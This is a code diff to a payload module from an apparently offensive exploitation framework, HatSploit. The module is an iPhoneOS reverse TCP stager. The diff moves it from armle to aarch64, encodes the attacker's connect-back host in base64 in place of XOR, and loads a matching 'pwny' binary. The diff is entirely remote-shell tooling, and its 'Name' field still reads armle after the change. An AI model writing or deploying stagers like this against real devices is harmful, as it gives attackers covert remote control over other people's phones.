@@ -20,15 +20,15 @@ class HatSploitPayload(Payload, StringTools):
     details = {
         'Category': "stager",
         'Name': "iPhoneOS armle Pwny Reverse TCP",
-        'Payload': "iphoneos/armle/pwny_reverse_tcp",
+        'Payload': "iphoneos/aarch64/pwny_reverse_tcp",
         'Authors': [
             'Ivan Nikolsky (enty8080) - payload developer'
         ],
-        'Description': "Pwny reverse TCP payload for iPhoneOS armle.",
+        'Description': "Pwny reverse TCP payload for iPhoneOS aarch64.",
         'Comments': [
             ''
         ],
-        'Architecture': "armle",
+        'Architecture': "aarch64",
         'Platform': "iphoneos",
         'Rank': "high",
         'Type': "reverse_tcp"
@@ -59,11 +59,11 @@ class HatSploitPayload(Payload, StringTools):
 
         self.payload.update({
             'Args': self.payload['Args'].format(
-                self.xor_string(connback_host),
-                self.xor_string(connback_host)
+                self.base64_string(connback_host),
+                self.base64_string(connback_host)
             )
         })
 
         return open(
-            self.config.path_config['data_path'] + 'pwny/pwny.armle', 'rb'
+            self.config.path_config['data_path'] + 'pwny/pwny.aarch64', 'rb'
         ).read()
